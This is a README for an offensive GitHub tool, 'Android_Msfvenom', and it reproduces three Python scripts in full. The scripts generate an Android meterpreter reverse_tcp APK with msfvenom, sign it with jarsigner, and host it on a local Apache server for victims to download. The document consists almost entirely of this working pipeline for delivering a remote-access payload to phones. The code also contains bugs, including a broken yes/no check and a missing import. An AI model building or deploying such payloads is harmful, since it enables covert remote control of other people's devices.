```
 ______  __   __  _____   ______  ______  __  _____       ______  ______  ______  ______  ______  ______    
/\  __ \/\ "-.\ \/\  __-./\  == \/\  __ \/\ \/\  __-.    /\  __ \/\  ___\/\  ___\/\  ___\/\  ___\/\  ___\   
\ \  __ \ \ \-.  \ \ \/\ \ \  __<\ \ \/\ \ \ \ \ \/\ \   \ \  __ \ \ \___\ \ \___\ \  __\\ \___  \ \___  \  
 \ \_\ \_\ \_\\"\_\ \____-\ \_\ \_\ \_____\ \_\ \____-    \ \_\ \_\ \_____\ \_____\ \_____\/\_____\/\_____\ 
  \/_/\/_/\/_/ \/_/\/____/ \/_/ /_/\/_____/\/_/\/____/     \/_/\/_/\/_____/\/_____/\/_____/\/_____/\/_____/ 
```                                                                                                  
#Android_Msfvenom
__DESCRIPTION__: A faster way to generate and sign *android files*, for mobile access (Can be hosted on a local apache server)
------------------------------------------------------------------------------------------------------------------------
__FILE__: [generate_apk.py](https://github.com/scriptedp0ison/Android_Msfvenom/blob/master/generate_apk.py)
__USE__: This file is used to generate the apk (Android Package Kit) using metasploits [Msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

```python
import os
import time
import android_signer
import apache_server
import subprocess

#def the function to generate the apk
def android_msfvenom():
    get_gen = raw_input('[+] Generate apk using msfvenom: ')
    if get_gen == 'yes' or get_gen == 'y':
        get_name = raw_input('[+] Enter the name of the desired apk file: ')
        try:
            apk_name = get_name
        except Exception:
            print('[+] Failed to set name: {}! Exitting...'.format(apk_name))
            time.sleep(3)
        else:
            print('[+] Name set to: {}'.format(get_name))
            
        #try to change the directory
        login = os.getlogin()
        print('[+] Attempting to change directory to /{}/Desktop'.format(login))

        try:
            os.chdir('/{}/Desktop'.format(login))
        except Exception:
            working_direc = os.getcwd()
            print('[+] Could not change the directory to the desktop, look for file under {}'.format(working_direc))
        else:
            print('[+] Directory set to {}'.format(os.getcwd()))

        #get LHOST and LPORT
        get_host = raw_input('[+] Enter ip address: ')
        get_port = raw_input('[+] Enter connect back port: ')
        print('[+] Generating apk(defaulting to desktop)...')
        try:
            subprocess.call(('msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} R > {}.apk'.format(get_host, get_port, get_name)), shell=True)
        except Exception:
            print('[+] Failed to generate apk! Exitting...')
            time.sleep(3)
        else:
            print('[+] Apk file successfully created! File located in {}'.format(os.getcwd()))

    elif get_gen == 'no' or get_gen == 'n':
        print('[+] Quittting...')
        exit()
        time.sleep(3)

android_msfvenom()
android_signer.sign_apk()
```

__FILE__: [android_signer.py](https://github.com/scriptedp0ison/Android_Msfvenom/blob/master/android_signer.py)
__USE__: This file is used to sign the apk file, that can be created using [generate_apk.py](https://github.com/scriptedp0ison/Android_Msfvenom/blob/master/generate_apk.py), the file is then signed using [jarsigner](http://docs.oracle.com/javase/7/docs/technotes/tools/windows/jarsigner.html), will a validity of [10,000 days](https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=10+000+days+in+years) (27 years)

```python
import os
import time
import apache_server
import subprocess

#def the function to sign the apk
def sign_apk():
    os.chdir(('/{}/Desktop'.format(os.getlogin())))
    subprocess.call('ls -alt', shell=True)
    get_apk = raw_input('[+] Enter the name of the apk file: ')

    try:
        keystore = raw_input('[+] Enter key store name (d for default): ')
        if keystore == 'd':
            keystore = 'my-release-key'
        else:
            keystore = keystore
        subprocess.call(('keytool -genkey -V -keystore {}.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000'.format(keystore)), 
                                                                                                                                        shell=True)
    except Exception:
        print('[+] Could not generate keystore, alias, keyalg, or keysize! Validity set to 0! Exitting...')
        time.sleep(3)
        exit()
    else:
        print('[+] Keystore, Alias, Keyalg, Keysize, and validity generated! Executing Jarsigner... ')

    try:
        subprocess.call(('jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {}.keystore {} alias_name'.format(keystore, get_apk)), 
                                                                                                            shell=True)
    except Exception:
        print('[+] Could not execute jarsigner command line arguments! Exitting...')
        time.sleep(3)
        exit()
    else:
        print('[+] Successfully executed jarsigner! Checking if {} was successfully signed...'.format(get_apk))

    try:
        subprocess.call(('jarsigner -verify -verbose -certs {}'.format(get_apk)), shell=True)
    except Exception:
        print('[+] Could not verify that the apk {} was signed! You may run into problems later! Exitting...'.format(get_apk))
        time.sleep(3)
        exit()
    else:
        print('[+] Apk file {} was signed successfully! Executing apache server function...'.format(get_apk))
        time.sleep(2)
        server_start()

def server_start():
    apache_server.start_apache()
```

__FILE__: [apache_server.py](https://github.com/scriptedp0ison/Android_Msfvenom/blob/master/apache_server.py)
__USE__: This file is used to start the [apache2](https://httpd.apache.org/) server (/etc/init.d/apache2 start), and upload the generated apk file to /var/www/html

```python
import time
import os
import subprocess
from datetime import datetime

#def the function for uploading the apk file to the server
def start_apache():
    print('[+] Starting apache server...')
    time.sleep(3)
    try:
        subprocess.call('service apache2 start', shell=True)
    except Exception:
        print('[+] Could not start apache server! Exitting...')
        time.sleep(3)
        exit()
    else:
        subprocess.call('ls -alt /var/www/html', shell=True)
        print('[+] Apache server started!')
        time.sleep(3)
        server_upload()
        
def server_upload():
    subprocess.call('ls -alt', shell=True)
    file_upload = raw_input('[+] Apache server started! Choose file to upload to server: ')
    try:
        subprocess.call(('mv /{}/Desktop/{} /var/www/html'.format(os.getlogin(), file_upload)), shell=True)
    except Exception:
        print('[+] Could not move /{}/Desktop/{} to /var/www/html! Try moving the file manually! Apache server is up and running! Exitting...')
        time.sleep(3)
        exit()
    else:
        ip = raw_input('[+] Enter current ip address: ')
        print('[+] Ip address set to: {}'.format(ip))
        check_file = raw_input('[+] /{}/Desktop/{} was successfully move to /var/www/html! Open browser to view uploads: '.format(os.getlogin(),
                                                                                                                                    file_upload))
        if check_file == 'yes' or 'y':
            print('[+] Starting browser...')
            time.sleep(3)
            try:
                subprocess.call(('firefox {}'.format(ip)), shell=True)
            except Exception:
                print('Firefox is not installed! Trying Chrome...')
                try:
                    subprocess.call(('chrome {}'.format(ip)), shell=True)
                except Exception:
                    print('Chrome is not installed! Trying iceweasel...')
                    try:
                        subprocess.call(('iceweasel {}'.format(ip)), shell=True)
                    except Exception:
                        system = platform.system()
                        print('[+] Could not determine browser running on your {} machine! Try navigating manually! Exitting...'.format(system))
                        time.sleep(3)
                        exit()
                    else:
                        print('[+] Finished with exit code 0!')
                        exit()
                else:
                    print('[+] Finished with exit code 0!')
                    exit()
            else:
                print('[+] Finished with exit code 0!')
                exit()
        elif check_file == 'no' or check_file == 'n':
            print('[+] Exitting...')
            time.sleep(3)
```


